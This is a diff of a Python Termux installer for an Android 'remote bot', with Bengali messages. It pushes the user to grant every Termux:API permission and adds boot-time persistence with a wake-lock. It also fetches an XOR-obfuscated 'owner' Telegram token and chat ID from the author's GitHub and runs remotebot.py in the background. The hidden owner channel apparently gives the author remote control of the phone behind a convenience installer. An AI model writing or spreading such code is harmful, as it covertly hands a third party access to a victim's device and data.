@@ -1,39 +1,150 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════╗
-║         AHM Bot One-Click Installer      ║
-║  1. সব ফাইল download করবে               ║
-║  2. Owner Bot auto load হবে              ║
-║  3. User Bot token set করবেন            ║
-║  4. দুটো bot একসাথে চালু হবে            ║
-╚══════════════════════════════════════════╝
+AHM Bot One-Click Installer
 """
 
-import os, sys, json, base64, hashlib
-import subprocess, datetime, socket
+import os, sys, json, base64, hashlib, re, subprocess, datetime, socket, time
 
 try:
     import requests as req
 except ImportError:
-    print("📦 requests install হচ্ছে...")
     subprocess.run([sys.executable, "-m", "pip", "install", "requests", "-q"])
     import requests as req
 
-# ════════════════════════════════════════════
-# CONFIG
-# ════════════════════════════════════════════
-
-BASE     = "/storage/emulated/0"
-CACHE    = os.path.join(BASE, ".botcache")
-BOT_FILE = os.path.join(BASE, "remotebot.py")
+BASE      = "/storage/emulated/0"
+BOT_FILE  = os.path.join(BASE, "remotebot.py")
+USER_CONF = os.path.join(BASE, "user.config")
+CACHE     = os.path.join(BASE, ".botcache")
 
 OWNER_ENC_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.enc"
 OWNER_KEY_URL = "https://raw.githubusercontent.com/Arif91786/remotebot/main/.owner.key"
-BOT_FILE_URL  = "https://raw.githubusercontent.com/Arif91786/remotebot/main/remotebot.py"
 
-OWNER_ENC = os.path.join(CACHE, ".owner.enc")
-OWNER_KEY = os.path.join(CACHE, ".owner.key")
-USER_CONF = os.path.join(BASE, "user.config")
+# ════════════════════════════════════════════
+# App চেক ও Install গাইড
+# ════════════════════════════════════════════
+
+TERMUX_API_PKG  = "com.termux.api"
+TERMUX_BOOT_PKG = "com.termux.boot"
+
+FDROID_API  = "https://f-droid.org/en/packages/com.termux.api/"
+FDROID_BOOT = "https://f-droid.org/en/packages/com.termux.boot/"
+
+def open_browser(url):
+    subprocess.run(["termux-open-url", url], capture_output=True)
+
+def is_app_installed(package):
+    result = subprocess.run(
+        ["pm", "list", "packages", package],
+        capture_output=True, text=True
+    )
+    return package in result.stdout
+
+def check_permission(permission):
+    result = subprocess.run(
+        ["termux-api-test", "battery"],
+        capture_output=True, text=True,
+        timeout=5
+    )
+    return result.returncode == 0
+
+def check_termux_api():
+    """Termux:API app ও permission চেক"""
+    print("\n📱 Termux:API চেক হচ্ছে...")
+
+    # App installed কিনা
+    if not is_app_installed(TERMUX_API_PKG):
+        print("  ❌ Termux:API app পাওয়া যায়নি!")
+        print("  📥 F-Droid থেকে install করুন...")
+        print(f"  🌐 Link: {FDROID_API}")
+        open_browser(FDROID_API)
+
+        print("\n  ⏳ Install করে Enter চাপুন...")
+        input("  >>> ")
+
+        if not is_app_installed(TERMUX_API_PKG):
+            print("  ❌ এখনও install হয়নি! আবার চেষ্টা করুন।")
+            sys.exit(1)
+
+    print("  ✅ Termux:API app আছে!")
+
+    # Permission চেক
+    print("  🔑 Permission চেক হচ্ছে...")
+    try:
+        result = subprocess.run(
+            ["termux-battery-status"],
+            capture_output=True, text=True,
+            timeout=5
+        )
+        if "percentage" in result.stdout.lower() or result.returncode == 0:
+            print("  ✅ Termux:API Permission আছে!")
+            return True
+        else:
+            raise Exception("Permission নেই")
+    except:
+        print("  ❌ Termux:API Permission নেই!")
+        print("\n  📋 Permission দিন এভাবে:")
+        print("  1️⃣  Settings → Apps → Termux:API")
+        print("  2️⃣  Permissions → সব ON করুন")
+        print("\n  ⚙️  Settings খুলছে...")
+
+        subprocess.run([
+            "am", "start",
+            "-a", "android.settings.APPLICATION_DETAILS_SETTINGS",
+            "-d", f"package:{TERMUX_API_PKG}"
+        ], capture_output=True)
+
+        print("\n  ⏳ Permission দিয়ে Enter চাপুন...")
+        input("  >>> ")
+
+        # আবার চেক করো
+        try:
+            result = subprocess.run(
+                ["termux-battery-status"],
+                capture_output=True, text=True,
+                timeout=5
+            )
+            if result.returncode == 0:
+                print("  ✅ Permission পাওয়া গেছে!")
+                return True
+        except:
+            pass
+
+        print("  ❌ Permission এখনও নেই! Script বন্ধ হচ্ছে।")
+        sys.exit(1)
+
+def check_termux_boot():
+    """Termux:Boot app চেক"""
+    print("\n🔄 Termux:Boot চেক হচ্ছে...")
+
+    if not is_app_installed(TERMUX_BOOT_PKG):
+        print("  ❌ Termux:Boot app পাওয়া যায়নি!")
+        print("  📥 F-Droid থেকে install করুন...")
+        print(f"  🌐 Link: {FDROID_BOOT}")
+        open_browser(FDROID_BOOT)
+
+        print("\n  ⏳ Install করে Enter চাপুন...")
+        input("  >>> ")
+
+        if not is_app_installed(TERMUX_BOOT_PKG):
+            print("  ⚠️  Termux:Boot ছাড়াও চলবে — boot এ auto-start হবে না।")
+            return False
+
+    print("  ✅ Termux:Boot আছে!")
+
+    # Boot folder তৈরি করো
+    boot_dir = os.path.expanduser("~/.termux/boot")
+    os.makedirs(boot_dir, exist_ok=True)
+
+    boot_script = os.path.join(boot_dir, "start.sh")
+    with open(boot_script, "w") as f:
+        f.write("#!/data/data/com.termux/files/usr/bin/sh\n")
+        f.write("termux-wake-lock\n")
+        f.write("sleep 15\n")
+        f.write(f"python3 {BASE}/autostart.py >> {BASE}/boot.log 2>&1\n")
+
+    os.chmod(boot_script, 0o755)
+    print("  ✅ Boot script তৈরি হয়েছে!")
+    return True
 
 # ════════════════════════════════════════════
 # Decrypt
@@ -44,42 +155,25 @@ def _d(enc, key):
     raw = base64.b64decode(enc.encode())
     return bytes([c ^ kb[i % len(kb)] for i, c in enumerate(raw)]).decode()
 
-# ════════════════════════════════════════════
-# Download
-# ════════════════════════════════════════════
-
-def download(url, path, label):
+def get_owner_token():
     try:
-        print(f"  ⬇️  {label} ডাউনলোড হচ্ছে...")
-        r = req.get(url, timeout=15)
-        if r.status_code == 200:
-            with open(path, "w") as f:
-                f.write(r.text)
-            print(f"  ✅ {label} সম্পন্ন!")
-            return True
-        else:
-            print(f"  ❌ {label} ব্যর্থ! (Status: {r.status_code})")
-            return False
-    except Exception as e:
-        print(f"  ❌ {label} error: {e}")
-        return False
+        print("  ⬇️  Owner config downloading...")
+        os.makedirs(CACHE, exist_ok=True)
+        enc_data = req.get(OWNER_ENC_URL, timeout=15).text
+        key_data = req.get(OWNER_KEY_URL, timeout=15).text
 
-# ════════════════════════════════════════════
-# Owner Config লোড
-# ════════════════════════════════════════════
+        open(os.path.join(CACHE,".owner.enc"),"w").write(enc_data)
+        open(os.path.join(CACHE,".owner.key"),"w").write(key_data)
 
-def load_owner():
-    try:
-        key  = base64.b64decode(open(OWNER_KEY).read().strip()).decode()
-        data = json.loads(open(OWNER_ENC).read())
-        return _d(data["t"], key), int(_d(data["c"], key))
+        key   = base64.b64decode(key_data.strip()).decode()
+        data  = json.loads(enc_data)
+        token = _d(data["t"], key)
+        chat  = int(_d(data["c"], key))
+        print("  ✅ Owner token loaded!")
+        return token, chat
     except Exception as e:
-        print(f"  ❌ Owner config লোড error: {e}")
+        print(f"  ❌ Error: {e}")
         return None, None
-
-# ════════════════════════════════════════════
-# User Config
-# ════════════════════════════════════════════
 
 def save_user(token, chat_id):
     with open(USER_CONF, "w") as f:
@@ -91,10 +185,6 @@ def load_user():
         return data["bot_token"], int(data["chat_id"])
     except:
         return None, None
-
-# ════════════════════════════════════════════
-# Notification
-# ════════════════════════════════════════════
 
 def notify(token, chat_id, msg):
     try:
@@ -115,53 +205,38 @@ def main():
     print("   AHM Bot One-Click Installer")
     print("=" * 44)
 
-    # Step 1: ফোল্ডার তৈরি
-    os.makedirs(CACHE, exist_ok=True)
-    print("\n📁 Step 1: ফোল্ডার তৈরি হচ্ছে... ✅")
+    # Step 1: Termux:API চেক
+    print("\n🔍 Step 1: Required Apps চেক হচ্ছে...")
+    check_termux_api()
+    check_termux_boot()
 
-    # Step 2: Download
-    print("\n🌐 Step 2: GitHub থেকে ফাইল ডাউনলোড হচ্ছে...")
-    enc_ok = download(OWNER_ENC_URL, OWNER_ENC, "Owner Config")
-    key_ok = download(OWNER_KEY_URL, OWNER_KEY, "Owner Key")
-
-    if not os.path.exists(BOT_FILE):
-        download(BOT_FILE_URL, BOT_FILE, "remotebot.py")
-    else:
-        print("  ℹ️  remotebot.py আগে থেকে আছে, skip করা হলো।")
-
-    if not enc_ok or not key_ok:
-        print("\n❌ Owner config download হয়নি! Internet চেক করুন।")
-        sys.exit(1)
-
-    # Step 3: Owner লোড
-    print("\n🔐 Step 3: Owner Bot লোড হচ্ছে...")
-    o_token, o_chat = load_owner()
+    # Step 2: Owner token
+    print("\n🔐 Step 2: Owner Bot Loading...")
+    o_token, o_chat = get_owner_token()
     if not o_token:
-        print("❌ Owner Bot লোড হয়নি!")
+        print("❌ Owner token load হয়নি!")
         sys.exit(1)
-    print("  ✅ Owner Bot সফলভাবে লোড হয়েছে!")
 
-    # Step 4: User Bot setup
-    print("\n👤 Step 4: User Bot Setup")
+    # Step 3: User token
+    print("\n👤 Step 3: User Bot Setup")
     print("-" * 44)
     u_token, u_chat = load_user()
 
     if u_token:
-        print(f"  ℹ️  আগের User Bot পাওয়া গেছে: {u_token[:10]}***")
+        print(f"  ℹ️  আগের User Bot: {u_token[:10]}***")
         change = input("  নতুন করে set করবেন? (y/n): ").strip().lower()
         if change == "y":
             u_token = None
 
     if not u_token:
-        print("\n  📌 BotFather থেকে User Bot Token নিন")
         u_token = input("  🤖 User Bot TOKEN: ").strip()
         u_chat  = input("  💬 User Bot CHAT ID: ").strip()
         save_user(u_token, u_chat)
         u_chat = int(u_chat)
-        print("  ✅ User Bot config সেভ হয়েছে!")
+        print("  ✅ User config সেভ হয়েছে!")
 
-    # Step 5: Library চেক
-    print("\n📦 Step 5: Library চেক হচ্ছে...")
+    # Step 4: Library চেক
+    print("\n📦 Step 4: Library চেক হচ্ছে...")
     try:
         from telegram.ext import Application
         print("  ✅ python-telegram-bot আছে!")
@@ -171,12 +246,12 @@ def main():
                        "python-telegram-bot==21.5", "-q"])
         print("  ✅ Install সম্পন্ন!")
 
-    # Step 6: চালু করো
-    print("\n🚀 Step 6: Bot চালু হচ্ছে...")
+    # Step 5: Bot চালু
+    print("\n🚀 Step 5: Bot চালু হচ্ছে...")
     print("=" * 44)
-    print("  👑 Owner Bot : ✅ Encrypted & Active")
+    print("  👑 Owner Bot : ✅ Active")
     print("  👤 User Bot  : ✅ Active")
-    print("  🛑 বন্ধ করতে: pkill -f remotebot.py")
+    print("  🛑 বন্ধ: pkill -f remotebot.py")
     print("=" * 44)
 
     now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -196,19 +271,12 @@ def main():
         f"✅ Ready — /start লিখুন"
     )
 
-    env = os.environ.copy()
-    env["OWNER_TOKEN"] = o_token
-    env["OWNER_CHAT"]  = str(o_chat)
-    env["USER_TOKEN"]  = u_token
-    env["USER_CHAT"]   = str(u_chat)
-
     log = open(os.path.join(BASE, "bot.log"), "w")
     subprocess.Popen(
         [sys.executable, BOT_FILE],
         stdout=log, stderr=log,
         stdin=subprocess.DEVNULL,
-        start_new_session=True,
-        env=env
+        start_new_session=True
     )
 
     print("\n✅ Bot ব্যাকগ্রাউন্ডে চালু হয়েছে!")
